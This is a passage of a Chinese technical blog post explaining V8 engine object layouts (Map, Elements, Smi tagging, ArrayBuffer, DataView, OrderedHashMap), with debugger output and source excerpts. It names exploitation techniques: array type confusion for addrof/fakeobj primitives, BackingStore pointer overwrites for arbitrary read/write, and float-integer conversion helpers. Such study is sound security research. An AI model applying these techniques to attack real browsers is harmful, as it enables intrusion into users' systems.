的指针。 <code>Map</code> 中比较重要的字段是一个指向
<code>DescriptorArray</code> 的指针，里面包含有关name
properties的信息，例如属性名和存储属性值的位置。 具有相同
<code>Map</code> 的两个 <code>JS object</code>
，就代表具有相同的类型（即具有以相同顺序命名的相同属性），比较
<code>Map</code> 的地址即可确定类型是否⼀致，同理，替换掉
<code>Map</code> 就可以进行类型混淆。</p>
<p><strong>在一些利用中，可以通过伪造 <code>Type</code> 字段来伪造
<code>Map</code> 。</strong></p>
<h2 id="properties">Properties</h2>
<p><code>Properties</code> 用于保持非数字索引的属性，分为
<code>Inline Property</code> ，<code>Fast Properties</code> 和
<code>Dictionary Properties</code> 。</p>
<h3 id="inline-property">Inline Property</h3>
<p>即 <code>in-object proterty</code> ，存放在 <code>object</code>
本身，而不是在 <code>Properties</code> 指针指向的内存，需要
<code>Descriptor Array</code> 。</p>
<h3 id="fast-properties">Fast Properties</h3>
<p><code>Fast Properties</code> 线性保存在 <code>Properties</code>
指针指向的内存中，需要 <code>Descriptor Array</code> 。</p>
<h3 id="dictionary-properties">Dictionary Properties</h3>
<p><code>Dictionary Properties</code> 即
<code>Slow Properties</code>，以哈希表的形式保存在
<code>Properties</code> 指针指向的内存中，不需要
<code>Descriptor Array</code> 。</p>
<h2 id="elements">Elements</h2>
<p><code>Elements</code> 用于保存数字索引的属性。</p>
<h3 id="packed-elements-holey-elements">Packed Elements &amp; Holey
Elements</h3>
<p>如果各个属性之间连续，那么可以直接开一个数组（下标从 0 开始）来表示
<code>Elements</code>，如果有的下标没有对应的属性则数组中该下标对应的值为一个特殊值，此时这个
<code>Elements</code> 被称为 <code>Holey Elements</code>
。如果数组中每个下标都对应属性则这个 <code>Elements</code> 被称为
<code>Packed Elements</code> 。</p>
<p>例如下面这个脚本：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> a[<span class="number">1</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a[<span class="number">1</span>]);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"></span><br><span class="line">a.<span class="property">__proto__</span> = &#123;<span class="number">1</span>: <span class="string">&#x27;B&#x27;</span>, <span class="number">2</span>: <span class="string">&quot;C&quot;</span>&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a[<span class="number">0</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a[<span class="number">1</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a[<span class="number">2</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a[<span class="number">3</span>]);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div>
<p>调试结果如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x37815f38bba9 &lt;JSArray[3]&gt;</span><br><span class="line">pwndbg&gt; job 0x37815f38bba9</span><br><span class="line">0x37815f38bba9: [JSArray]</span><br><span class="line"> - map: 0x39d6446c3069 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1b0fcc0517a1 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x37815f38bb21 &lt;FixedArray[3]&gt; [PACKED_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x010c0d5c0c21 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x247fa62001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x37815f38bb21 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x010c0d5c74b1 &lt;String[#1]: a&gt;</span><br><span class="line">           1: 0x010c0d5c7571 &lt;String[#1]: b&gt;</span><br><span class="line">           2: 0x1b0fcc05f4f9 &lt;String[#1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x37815f38bba9</span><br><span class="line">0x37815f38bba9: [JSArray]</span><br><span class="line"> - map: 0x39d6446c30b9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1b0fcc0517a1 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x37815f38bbc9 &lt;FixedArray[3]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x010c0d5c0c21 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x247fa62001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x37815f38bbc9 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x010c0d5c74b1 &lt;String[#1]: a&gt;</span><br><span class="line">           1: 0x010c0d5c05b1 &lt;the_hole&gt;</span><br><span class="line">           2: 0x1b0fcc05f4f9 &lt;String[#1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x37815f38bba9</span><br><span class="line">0x37815f38bba9: [JSArray]</span><br><span class="line"> - map: 0x39d6446ca599 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x37815f38bbf1 &lt;Object map = 0x39d6446ca639&gt;</span><br><span class="line"> - elements: 0x37815f38bbc9 &lt;FixedArray[3]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x010c0d5c0c21 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x247fa62001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x37815f38bbc9 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x010c0d5c74b1 &lt;String[#1]: a&gt;</span><br><span class="line">           1: 0x010c0d5c05b1 &lt;the_hole&gt;</span><br><span class="line">           2: 0x1b0fcc05f4f9 &lt;String[#1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; job 0x37815f38bbf1</span><br><span class="line">0x37815f38bbf1: [JS_OBJECT_TYPE]</span><br><span class="line"> - map: 0x39d6446ca639 &lt;Map(HOLEY_ELEMENTS)&gt; [DictionaryProperties]</span><br><span class="line"> - prototype: 0x1b0fcc042091 &lt;Object map = 0x39d6446c0229&gt;</span><br><span class="line"> - elements: 0x37815f38bc29 &lt;FixedArray[19]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x37815f38bd01 &lt;NameDictionary[17]&gt; &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x37815f38bc29 &lt;FixedArray[19]&gt; &#123;</span><br><span class="line">           0: 0x010c0d5c05b1 &lt;the_hole&gt;</span><br><span class="line">           1: 0x1b0fcc05f551 &lt;String[#1]: B&gt;</span><br><span class="line">           2: 0x1b0fcc05f581 &lt;String[#1]: C&gt;</span><br><span class="line">        3-18: 0x010c0d5c05b1 &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/54ccd1274efaf3d69751016075870e1a.png"
                     
alt="在这里插入图片描述" 
                >
<figcaption aria-hidden="true">在这里插入图片描述</figcaption>
</figure>
<h3 id="fast-elements-dictionary-elements">Fast Elements &amp;
Dictionary Elements</h3>
<p><code>Fast Elements</code> 和 <code>Dictionary Elements</code>
的区别是存储方式是线性保存还是词典保存。
<code>Dictionary Elements</code> 主要用于 <code>Holey Element</code>
特别多的情况。</p>
<h1 id="常见类型结构">常见类型结构</h1>
<p>处理通用对象外，v8 还内置了一些常见类型。</p>
<p>在 v8 源码的 <code>v8/src/objects/objects.h</code> 中有对 v8
各种类型之间继承关系的描述。</p>
<blockquote>
<p>Most object types in the V8 JavaScript are described in this
file.</p>
<p>Inheritance hierarchy:</p>
<ul>
<li>Object
<ul>
<li>Smi (immediate small integer)</li>
<li>TaggedIndex (properly sign-extended immediate small integer)</li>
<li>HeapObject (superclass for everything allocated in the heap)
<ul>
<li>JSReceiver (suitable for property access)
<ul>
<li>JSObject
<ul>
<li>JSArray
<ul>
<li>TemplateLiteralObject</li>
</ul></li>
<li>JSArrayBuffer</li>
<li>JSArrayBufferView
<ul>
<li>JSTypedArray</li>
<li>JSDataView</li>
</ul></li>
<li>JSCollection
<ul>
<li>JSSet</li>
<li>JSMap</li>
</ul></li>
<li>JSCustomElementsObject (may have elements despite empty FixedArray)
<ul>
<li>JSSpecialObject (requires custom property lookup handling)
<ul>
<li>JSGlobalObject</li>
<li>JSGlobalProxy</li>
<li>JSModuleNamespace</li>
</ul></li>
<li>JSPrimitiveWrapper</li>
</ul></li>
<li>JSDate</li>
<li>JSFunctionOrBoundFunctionOrWrappedFunction
<ul>
<li>JSBoundFunction</li>
<li>JSFunction</li>
<li>JSWrappedFunction</li>
</ul></li>
<li>JSGeneratorObject</li>
<li>JSMapIterator</li>
<li>JSMessageObject</li>
<li>JSRegExp</li>
<li>JSSetIterator</li>
<li>JSShadowRealm</li>
<li>JSSharedStruct</li>
<li>JSStringIterator</li>
<li>JSTemporalCalendar</li>
<li>JSTemporalDuration</li>
<li>JSTemporalInstant</li>
<li>JSTemporalPlainDate</li>
<li>JSTemporalPlainDateTime</li>
<li>JSTemporalPlainMonthDay</li>
<li>JSTemporalPlainTime</li>
<li>JSTemporalPlainYearMonth</li>
<li>JSTemporalTimeZone</li>
<li>JSTemporalZonedDateTime</li>
<li>JSWeakCollection
<ul>
<li>JSWeakMap</li>
<li>JSWeakSet</li>
</ul></li>
<li>JSCollator // If V8_INTL_SUPPORT enabled.</li>
<li>JSDateTimeFormat // If V8_INTL_SUPPORT enabled.</li>
<li>JSDisplayNames // If V8_INTL_SUPPORT enabled.</li>
<li>JSDurationFormat // If V8_INTL_SUPPORT enabled.</li>
<li>JSListFormat // If V8_INTL_SUPPORT enabled.</li>
<li>JSLocale // If V8_INTL_SUPPORT enabled.</li>
<li>JSNumberFormat // If V8_INTL_SUPPORT enabled.</li>
<li>JSPluralRules // If V8_INTL_SUPPORT enabled.</li>
<li>JSRelativeTimeFormat // If V8_INTL_SUPPORT enabled.</li>
<li>JSSegmenter // If V8_INTL_SUPPORT enabled.</li>
<li>JSSegments // If V8_INTL_SUPPORT enabled.</li>
<li>JSSegmentIterator // If V8_INTL_SUPPORT enabled.</li>
<li>JSV8BreakIterator // If V8_INTL_SUPPORT enabled.</li>
<li>WasmExceptionPackage</li>
<li>WasmTagObject</li>
<li>WasmGlobalObject</li>
<li>WasmInstanceObject</li>
<li>WasmMemoryObject</li>
<li>WasmModuleObject</li>
<li>WasmTableObject</li>
<li>WasmSuspenderObject</li>
</ul></li>
<li>JSProxy</li>
</ul></li>
<li>FixedArrayBase
<ul>
<li>ByteArray</li>
<li>BytecodeArray</li>
<li>FixedArray
<ul>
<li>HashTable
<ul>
<li>Dictionary</li>
<li>StringTable</li>
<li>StringSet</li>
<li>CompilationCacheTable</li>
<li>MapCache</li>
</ul></li>
<li>OrderedHashTable
<ul>
<li>OrderedHashSet</li>
<li>OrderedHashMap</li>
</ul></li>
<li>FeedbackMetadata</li>
<li>TemplateList</li>
<li>TransitionArray</li>
<li>ScopeInfo</li>
<li>SourceTextModuleInfo</li>
<li>ScriptContextTable</li>
<li>ClosureFeedbackCellArray</li>
</ul></li>
<li>FixedDoubleArray</li>
</ul></li>
<li>PrimitiveHeapObject
<ul>
<li>BigInt</li>
<li>HeapNumber</li>
<li>Name
<ul>
<li>String
<ul>
<li>SeqString
<ul>
<li>SeqOneByteString</li>
<li>SeqTwoByteString</li>
</ul></li>
<li>SlicedString</li>
<li>ConsString</li>
<li>ThinString</li>
<li>ExternalString
<ul>
<li>ExternalOneByteString</li>
<li>ExternalTwoByteString</li>
</ul></li>
<li>InternalizedString
<ul>
<li>SeqInternalizedString
<ul>
<li>SeqOneByteInternalizedString</li>
<li>SeqTwoByteInternalizedString</li>
</ul></li>
<li>ConsInternalizedString</li>
<li>ExternalInternalizedString
<ul>
<li>ExternalOneByteInternalizedString</li>
<li>ExternalTwoByteInternalizedString</li>
</ul></li>
</ul></li>
</ul></li>
<li>Symbol</li>
</ul></li>
<li>Oddball</li>
</ul></li>
<li>Context
<ul>
<li>NativeContext</li>
</ul></li>
<li>Cell</li>
<li>DescriptorArray</li>
<li>PropertyCell</li>
<li>PropertyArray</li>
<li>InstructionStream</li>
<li>AbstractCode, a wrapper around Code or BytecodeArray</li>
<li>GcSafeCode, a wrapper around Code</li>
<li>Map</li>
<li>Foreign</li>
<li>SmallOrderedHashTable
<ul>
<li>SmallOrderedHashMap</li>
<li>SmallOrderedHashSet</li>
</ul></li>
<li>SharedFunctionInfo</li>
<li>Struct
<ul>
<li>AccessorInfo</li>
<li>AsmWasmData</li>
<li>PromiseReaction</li>
<li>PromiseCapability</li>
<li>AccessorPair</li>
<li>AccessCheckInfo</li>
<li>InterceptorInfo</li>
<li>CallHandlerInfo</li>
<li>EnumCache</li>
<li>TemplateInfo
<ul>
<li>FunctionTemplateInfo</li>
<li>ObjectTemplateInfo</li>
</ul></li>
<li>Script</li>
<li>DebugInfo</li>
<li>BreakPoint</li>
<li>BreakPointInfo</li>
<li>CallSiteInfo</li>
<li>CodeCache</li>
<li>PropertyDescriptorObject</li>
<li>PromiseOnStack</li>
<li>PrototypeInfo</li>
<li>Microtask
<ul>
<li>CallbackTask</li>
<li>CallableTask</li>
<li>PromiseReactionJobTask
<ul>
<li>PromiseFulfillReactionJobTask</li>
<li>PromiseRejectReactionJobTask</li>
</ul></li>
<li>PromiseResolveThenableJobTask</li>
</ul></li>
<li>Module
<ul>
<li>SourceTextModule</li>
<li>SyntheticModule</li>
</ul></li>
<li>SourceTextModuleInfoEntry</li>
<li>StackFrameInfo</li>
</ul></li>
<li>FeedbackCell</li>
<li>FeedbackVector</li>
<li>PreparseData</li>
<li>UncompiledData
<ul>
<li>UncompiledDataWithoutPreparseData</li>
<li>UncompiledDataWithPreparseData</li>
</ul></li>
<li>SwissNameDictionary</li>
</ul></li>
</ul></li>
</ul>
<p>Formats of Object::ptr_: Smi: [31 bit signed int] 0<br />
HeapObject: [32 bit direct pointer] (4 byte aligned) | 01</p>
</blockquote>
<h2 id="smi">Smi</h2>
<p>所有不超过 0x7FFFFFFF 的整数都以 <code>Smi</code> 的形式存储。</p>
<ul>
<li>在 32 位上可以表示有符号的 31 位的整数，通过右移一位可以获得原始值。
<img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i-blog.csdnimg.cn/blog_migrate/ae233d26782a49735319c7940496238c.png%20=30%x"
                     
alt="在这里插入图片描述" 
                ><br />
</li>
<li>在 64 位上可以表示有符号的32位的整数，通过右移 32 位可以获得原始值
<img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i-blog.csdnimg.cn/blog_migrate/c30841e50e497ec96739d3edc71fed5f.png%20=60%x"
                     
alt="在这里插入图片描述" 
                ></li>
</ul>
<h2 id="heapobject-指针">HeapObject 指针</h2>
<p>最低位为 1 表示指向 <code>HeapObject</code> 的指针。</p>
<ul>
<li>32 位 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i-blog.csdnimg.cn/blog_migrate/582ef8279deb472ca013ef9053ded720.png%20=60%x"
                     
alt="在这里插入图片描述" 
                ></li>
<li>64位<br />
<img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i-blog.csdnimg.cn/blog_migrate/f90c4d59d4c6283024b03acd9096a47b.png%20=60%x"
                     
alt="在这里插入图片描述" 
                > ## Heap Number</li>
</ul>
<p>表示不能在 <code>Smi</code> 范围内表⽰的整数，均以 double
值的形式保存在 <code>Heap Number</code> 的 <code>Value</code> 里。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i-blog.csdnimg.cn/blog_migrate/2603f1a7f65fcda2dc4cfd0c167abd43.png%20=60%x"
                     
alt="在这里插入图片描述" 
                ></p>
<h2 id="string">String</h2>
<p>保存字符串对象，具体结构各版本之间可能存在差异。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i-blog.csdnimg.cn/blog_migrate/6843b54efe0c93343146abc1ca48869c.png%20=60%x"
                     
alt="在这里插入图片描述" 
                ></p>
<h2 id="jsarray">JSArray</h2>
<p>继承自 <code>Object</code> ，<code>HeapObject</code>
，<code>JSReceiver</code> 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i-blog.csdnimg.cn/blog_migrate/c92fe3233ac7844836598061c02f0ec5.png%20=80%x"
                     
alt="在这里插入图片描述" 
                > v8 的 <code>JSArray</code>
遵循图中格的变化，从左到右，从上到下，不可逆。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a304a5a6054e7c0085783876f4d2f007.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>规律：</p>
<ul>
<li>存在 <code>Smi</code> 和浮点数则都用浮点数表示</li>
<li>存在 <code>Object</code> 类型则都用 <code>Object</code>
类型表示。</li>
<li><code>elements</code> 之间空隙过大转为字典存储。</li>
</ul>
<p>在实际的漏洞利用中，我们常构造出 double array 和 obj array
的类型混淆，从而构建 addrof 和 fakeobj 原语。</p>
<h2 id="jsarraybuffer">JSArrayBuffer</h2>
<p><code>JSArrayBuffer</code> ，顾名思义，就是保存有⼀个被称作
<code>BackingStore</code> 的 buffer 的对象。 在 V8
中，对象通常被存放在由 V8 GC 管理的 mapped 区域，然而
<code>BackingStore</code> 是⼀个不被 V8 GC 管理的区域，(事实上它在
Chrome 里是由 PartitionAlloc 来管理，在 d8 里则是用 ptmalloc
来模拟管理)，此外，由于它不是由 GC 管理的 <code>HeapObject</code> ，因
此指向 <code>BackingStore</code> 的指针不是
<code>Tagged Value</code>（末尾不能为1）。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i-blog.csdnimg.cn/blog_migrate/dc99cfff31fb6bf83e791fc23fb4702e.png%20=80%x"
                     
alt="在这里插入图片描述" 
                ></p>
<ul>
<li>虽然在 <code>ArrayBuffer</code>
中描述了大小，但如果将此值重写为较大的值，则可以允许读取和写入的长度，超出
<code>BackingStore</code> 数组的范围。 同样，如果也可以重写
<code>BackingStore</code> 指针，则可以读取和写入任意内存地址，这些是在
exploit 中常用的方法。</li>
</ul>
<h2 id="jstypedarray">JSTypedArray</h2>
<p>由于 <code>JSArrayBuffer</code> 实际上只是持有
<code>BackingStore</code> 指针的对象，换句话说，它只是⼀个 buffer
，所以在 js 的设计⾥，对 <code>BackStore</code> 的读写需要依赖于
<code>TypedArray</code> 或者 <code>DataView</code> 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2c6b74b6162897cfdaeac0710e4ab8fa.png"
                     
alt="在这里插入图片描述" 
                > 在漏洞利用时通常使用
<code>JSTypedArray</code> 进行整型和浮点数类型的转换。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(ab);</span><br><span class="line"><span class="keyword">var</span> i64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    f64[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> i64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    i64[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// let val = &quot;0x1145141919810&quot;;</span></span><br><span class="line"><span class="keyword">let</span> val = <span class="number">0x1145141919810n</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">u2d</span>(val));</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">d2u</span>(<span class="title function_">u2d</span>(val))));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.501041597677047e-309</span></span><br><span class="line"><span class="comment">// 0x0001145141919810</span></span><br></pre></td></tr></table></figure></div>
<h2 id="jsdataview">JSDataView</h2>
<p>也是用来读写 <code>ArrayBuffer</code> 的 <code>BackingStore</code>
的内容的对象，在 exploit 里常用作最后的任意地址读写原语的构造。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a9646d8acb9db82a8299671d179052f1.png"
                     
alt="在这里插入图片描述" 
                > 利用 <code>JDataView</code>
实现的类型转换：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> val = <span class="number">0x1145141919810n</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">u2d</span>(val));</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">d2u</span>(<span class="title function_">u2d</span>(val))));</span><br></pre></td></tr></table></figure></div>
<h2 id="jsmap">JSMap</h2>
<p><code>JSMap</code> 是一种可以按照添加顺序遍历其中元素的 Hash Map ，即
<code>OrderedHashMap</code>。在 V8 漏洞利用中常与 Hole
类型漏洞结合使用。 <div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br></pre></td></tr></table></figure></div> 以 <code>9.5.172</code> 版本 V8
为例，<code>OrderedHashMap</code> 的查看方式如下： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/fcff33b0bb8c869c3094c13b2e01494b.png"
                     
alt="在这里插入图片描述" 
                > 这里解释一下各个字段的含义：</p>
<ul>
<li><code>FixedArray length</code>：是 V8 在访问
<code>OrderedHashMap</code> 时会将整个 <code>OrderedHashMap</code>
看作一个 <code>Array</code>，这个就是 <code>Array</code> 的长度。即除去
<code>Map</code> 和 <code>FixedArray length</code>
外的部分的长度的字节数除以 4 。</li>
<li><code>elements</code>：<code>Map</code> 中的 <code>key</code>
的数量。</li>
<li><code>delete</code>：<code>Map</code> 中删除的元素数量，也就是当前
<code>Map</code> 中 <code>Hole</code> 的数量。</li>
<li><code>buckets(smi)</code>：后面 <code>buckets(HashTable)</code>
的长度，通常是 2 的整数次幂。</li>
<li><code>capacity</code>：<code>elements</code> 区域能存放的
<code>Entry</code> 的数量。<code>capacity</code> 是 <code>buckets</code>
乘 2 计算出来的，在 <code>OrderedHashMap</code>
的内存区域中也没有体现。</li>
<li><code>buckets(HashTable)</code>：哈希表，在
<code>ComputeUnseededHash(key) &amp; (buckets - 1)</code>
计算出的位置上存放键值对在 <code>elements</code> 中的下标（实际是
<code>elements</code> 中的下标索引的一个单向链表）。该表默认填充为 -1
。</li>
<li><code>elements</code>：按照加入的顺序存放所有键值对组成的
<code>Entry</code> 。该表默认填充为 <code>undefine</code> 。</li>
</ul>
<p><strong>注意：在这个版本的 v8 中 32 位的 smi 不是左移 32 位而是左移 1
位，占用 4 字节。例如 1 表示为 0x00000002，-1 表示为 0xFFFFFFFE
。</strong></p>
<p><code>OrderedHashMap</code>
在内存中的分布大致如下图所示，其中每个格子的大小为 4 字节。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/bde9dfcca26eff4e11825181c59cd570.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h3 id="set">set</h3>
<p><code>set(key, value)</code> 是 <code>Map</code>
中用来设置键值对的方法，具体接口定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">TF_BUILTIN</span>(MapPrototypeSet, CollectionsBuiltinsAssembler)</span><br></pre></td></tr></table></figure></div>
<p>这里假设 <code>key</code> 的类型为 <code>smi</code> ，首先
<code>TryLookupOrderedHashTableIndex</code> 查找 <code>key</code> 对应的
<code>Entry</code> ，从代码中可以看到 <code>JSMap</code> 使用的哈希函数
<code>ComputeUnseededHash</code> 。程序最终通过
<code>FindOrderedHashTableEntry</code> 查找 <code>key</code> 对应的
<code>Entry</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">TNode&lt;Word32T&gt; <span class="title">CollectionsBuiltinsAssembler::ComputeUnseededHash</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    TNode&lt;IntPtrT&gt; key)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// See v8::internal::ComputeUnseededHash()</span></span><br><span class="line">  TNode&lt;Word32T&gt; hash = <span class="built_in">TruncateIntPtrToInt32</span>(key);</span><br><span class="line">  hash = <span class="built_in">Int32Add</span>(<span class="built_in">Word32Xor</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">0xFFFFFFFF</span>)),</span><br><span class="line">                  <span class="built_in">Word32Shl</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">15</span>)));</span><br><span class="line">  hash = <span class="built_in">Word32Xor</span>(hash, <span class="built_in">Word32Shr</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">12</span>)));</span><br><span class="line">  hash = <span class="built_in">Int32Add</span>(hash, <span class="built_in">Word32Shl</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">2</span>)));</span><br><span class="line">  hash = <span class="built_in">Word32Xor</span>(hash, <span class="built_in">Word32Shr</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">4</span>)));</span><br><span class="line">  hash = <span class="built_in">Int32Mul</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">2057</span>));</span><br><span class="line">  hash = <span class="built_in">Word32Xor</span>(hash, <span class="built_in">Word32Shr</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">16</span>)));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Word32And</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">0x3FFFFFFF</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> CollectionType&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CollectionsBuiltinsAssembler::FindOrderedHashTableEntryForSmiKey</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    TNode&lt;CollectionType&gt; table, TNode&lt;Smi&gt; smi_key, TVariable&lt;IntPtrT&gt;* result,</span></span></span><br><span class="line"><span class="params"><span class="function">    Label* entry_found, Label* not_found)</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> TNode&lt;IntPtrT&gt; key_untagged = <span class="built_in">SmiUntag</span>(smi_key);</span><br><span class="line">  <span class="type">const</span> TNode&lt;IntPtrT&gt; hash =</span><br><span class="line">      <span class="built_in">ChangeInt32ToIntPtr</span>(<span class="built_in">ComputeUnseededHash</span>(key_untagged));</span><br><span class="line">  <span class="built_in">CSA_ASSERT</span>(<span class="keyword">this</span>, <span class="built_in">IntPtrGreaterThanOrEqual</span>(hash, <span class="built_in">IntPtrConstant</span>(<span 